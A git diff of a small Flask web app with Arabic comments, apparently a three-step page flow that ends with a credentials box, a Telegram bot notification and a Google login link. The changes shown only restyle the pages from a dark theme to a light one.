@@ -9,7 +9,7 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 GOOGLE_LOGIN_URL = "https://accounts.google.com"
 
-# الصفحة الأولى: الترحيب وزر التالي بالأخضر
+# الصفحة الأولى: الترحيب وزر التالي
 @app.route("/")
 def home():
   return render_template_string("""
@@ -22,8 +22,8 @@ def home():
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { 
-            background: #0b0b0b; 
-            color: #f5f5f5;
+            background: #f4f4f5; 
+            color: #1a1a1a;
             display: flex; 
             justify-content: center; 
             align-items: center; 
@@ -32,15 +32,15 @@ def home():
             padding: 20px; 
         }
         .box { 
-            background: #141414; 
+            background: #ffffff; 
             width: 100%; 
             max-width: 480px; 
-            min-height: 520px; 
-            padding: 60px 30px; 
-            border-radius: 20px; 
-            box-shadow: 0 8px 30px rgba(220, 20, 60, 0.25); 
+            min-height: 620px; 
+            padding: 80px 30px; 
+            border-radius: 24px; 
+            box-shadow: 0 10px 35px rgba(0, 0, 0, 0.08); 
             text-align: center; 
-            border: 1px solid #260a0a; 
+            border: 1px solid #e0e0e0; 
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -53,11 +53,11 @@ def home():
             align-items: center;
         }
         .glowing-circle {
-            width: 110px;
-            height: 110px;
+            width: 130px;
+            height: 130px;
             border-radius: 50%;
             border: 3px solid #ff0000;
-            box-shadow: 0 0 25px rgba(255, 0, 0, 0.6), inset 0 0 15px rgba(255, 0, 0, 0.4);
+            box-shadow: 0 0 25px rgba(255, 0, 0, 0.4);
             margin-bottom: 15px;
             background: #050505;
         }
@@ -66,17 +66,17 @@ def home():
             font-size: 20px;
             font-weight: 800;
             letter-spacing: 1.5px;
-            text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+            text-shadow: 0 0 10px rgba(255, 0, 0, 0.2);
         }
-        h1 { color: #ff2a2a; font-size: 22px; font-weight: 800; letter-spacing: 1px; text-shadow: 0 0 10px rgba(255, 0, 0, 0.5); margin-bottom: 30px; }
+        h1 { color: #ff2a2a; font-size: 22px; font-weight: 800; letter-spacing: 1px; text-shadow: 0 0 10px rgba(255, 0, 0, 0.2); margin-bottom: 35px; }
         .next-btn { 
             display: block; 
             width: 100%; 
             background: #28a745; 
             color: white; 
             border: none; 
-            border-radius: 10px; 
-            padding: 15px; 
+            border-radius: 12px; 
+            padding: 16px; 
             font-size: 16px; 
             font-weight: 600; 
             text-decoration: none; 
@@ -99,7 +99,7 @@ def home():
 </html>
 """)
 
-# الصفحة الثانية: التحقق من النص وزر الإرسال بالأخضر
+# الصفحة الثانية: التحقق من النص
 @app.route("/step2", methods=["GET", "POST"])
 def step2():
   error = ""
@@ -120,8 +120,8 @@ def step2():
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { 
-            background: #0b0b0b; 
-            color: #f5f5f5;
+            background: #f4f4f5; 
+            color: #1a1a1a;
             display: flex; 
             justify-content: center; 
             align-items: center; 
@@ -130,15 +130,15 @@ def step2():
             padding: 20px; 
         }
         .box { 
-            background: #141414; 
+            background: #ffffff; 
             width: 100%; 
             max-width: 480px; 
-            min-height: 520px; 
-            padding: 50px 30px; 
-            border-radius: 20px; 
-            box-shadow: 0 8px 30px rgba(220, 20, 60, 0.25); 
+            min-height: 620px; 
+            padding: 80px 30px; 
+            border-radius: 24px; 
+            box-shadow: 0 10px 35px rgba(0, 0, 0, 0.08); 
             text-align: center; 
-            border: 1px solid #260a0a; 
+            border: 1px solid #e0e0e0; 
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -151,12 +151,12 @@ def step2():
             align-items: center;
         }
         .glowing-circle {
-            width: 110px;
-            height: 110px;
+            width: 130px;
+            height: 130px;
             border-radius: 50%;
             border: 3px solid #ff0000;
-            box-shadow: 0 0 25px rgba(255, 0, 0, 0.6), inset 0 0 15px rgba(255, 0, 0, 0.4);
-            margin-bottom: 12px;
+            box-shadow: 0 0 25px rgba(255, 0, 0, 0.4);
+            margin-bottom: 15px;
             background: #050505;
         }
         .mod-title {
@@ -164,32 +164,32 @@ def step2():
             font-size: 20px;
             font-weight: 800;
             letter-spacing: 1.5px;
-            text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+            text-shadow: 0 0 10px rgba(255, 0, 0, 0.2);
         }
-        p.instruction { color: #d0d0d0; font-size: 15px; margin-bottom: 25px; font-weight: 500; line-height: 1.6; }
-        .error-msg { color: #ff4d4d; font-size: 13px; margin-bottom: 15px; background: #1f0a0a; padding: 10px; border-radius: 8px; border: 1px solid #4d1a1a; width: 100%; }
+        p.instruction { color: #444; font-size: 15px; margin-bottom: 25px; font-weight: 500; line-height: 1.6; }
+        .error-msg { color: #ff4d4d; font-size: 13px; margin-bottom: 15px; background: #fff5f5; padding: 12px; border-radius: 10px; border: 1px solid #ffcccc; width: 100%; }
         form { width: 100%; }
         input[type="text"] { 
             width: 100%; 
-            background: #000; 
-            border: 1px solid #333; 
-            border-radius: 10px; 
-            padding: 15px; 
+            background: #f9f9f9; 
+            border: 1px solid #ccc; 
+            border-radius: 12px; 
+            padding: 16px; 
             font-size: 16px; 
-            color: #fff; 
+            color: #000; 
             outline: none; 
             margin-bottom: 20px; 
             text-align: center;
             letter-spacing: 1px;
         }
-        input[type="text"]:focus { border-color: #ff2a2a; box-shadow: 0 0 8px rgba(255, 42, 42, 0.3); }
+        input[type="text"]:focus { border-color: #ff2a2a; box-shadow: 0 0 8px rgba(255, 42, 42, 0.2); }
         .submit-btn { 
             width: 100%; 
             background: #28a745; 
             color: white; 
             border: none; 
-            border-radius: 10px; 
-            padding: 15px; 
+            border-radius: 12px; 
+            padding: 16px; 
             font-size: 16px; 
             font-weight: 600; 
             cursor: pointer; 
@@ -218,7 +218,7 @@ def step2():
 </html>
 """, error=error)
 
-# الصفحة الثالثة: النص المحدث تماماً وزر تسجيل الدخول
+# الصفحة الثالثة: تسجيل الدخول
 @app.route("/step3")
 def step3():
   if BOT_TOKEN and CHAT_ID:
@@ -239,8 +239,8 @@ def step3():
     <style>
         * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }}
         body {{ 
-            background: #0b0b0b; 
-            color: #f5f5f5;
+            background: #f4f4f5; 
+            color: #1a1a1a;
             display: flex; 
             justify-content: center; 
             align-items: center; 
@@ -249,33 +249,33 @@ def step3():
             padding: 20px; 
         }}
         .box {{ 
-            background: #141414; 
+            background: #ffffff; 
             width: 100%; 
             max-width: 480px; 
-            min-height: 540px; 
-            padding: 40px 30px; 
-            border-radius: 20px; 
-            box-shadow: 0 8px 30px rgba(220, 20, 60, 0.25); 
+            min-height: 620px; 
+            padding: 80px 30px; 
+            border-radius: 24px; 
+            box-shadow: 0 10px 35px rgba(0, 0, 0, 0.08); 
             text-align: center; 
-            border: 1px solid #260a0a; 
+            border: 1px solid #e0e0e0; 
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
         }}
         .logo-container {{
-            margin-bottom: 20px;
+            margin-bottom: 25px;
             display: flex;
             flex-direction: column;
             align-items: center;
         }}
         .glowing-circle {{
-            width: 110px;
-            height: 110px;
+            width: 130px;
+            height: 130px;
             border-radius: 50%;
             border: 3px solid #ff0000;
-            box-shadow: 0 0 25px rgba(255, 0, 0, 0.6), inset 0 0 15px rgba(255, 0, 0, 0.4);
-            margin-bottom: 12px;
+            box-shadow: 0 0 25px rgba(255, 0, 0, 0.4);
+            margin-bottom: 15px;
             background: #050505;
         }}
         .mod-title {{
@@ -283,28 +283,28 @@ def step3():
             font-size: 20px;
             font-weight: 800;
             letter-spacing: 1.5px;
-            text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+            text-shadow: 0 0 10px rgba(255, 0, 0, 0.2);
         }}
-        p {{ color: #d0d0d0; font-size: 14.5px; line-height: 1.6; margin-bottom: 18px; }}
+        p {{ color: #444; font-size: 14.5px; line-height: 1.6; margin-bottom: 20px; }}
         .cred-box {{ 
-            background: #000; 
-            border: 1px solid #333; 
-            border-radius: 10px; 
-            padding: 15px; 
-            margin-bottom: 20px; 
+            background: #f9f9f9; 
+            border: 1px solid #ccc; 
+            border-radius: 12px; 
+            padding: 16px; 
+            margin-bottom: 22px; 
             text-align: left; 
             direction: ltr;
             width: 100%;
         }}
-        .cred-item {{ color: #ff5252; font-size: 14px; margin-bottom: 6px; font-family: monospace; font-weight: bold; }}
+        .cred-item {{ color: #ff2a2a; font-size: 14px; margin-bottom: 6px; font-family: monospace; font-weight: bold; }}
         .login-btn {{ 
             display: block; 
             width: 100%; 
             background: #28a745; 
             color: white; 
             border: none; 
-            border-radius: 10px; 
-            padding: 15px; 
+            border-radius: 12px; 
+            padding: 16px; 
             font-size: 16px; 
             font-weight: 600; 
             text-decoration: none; 
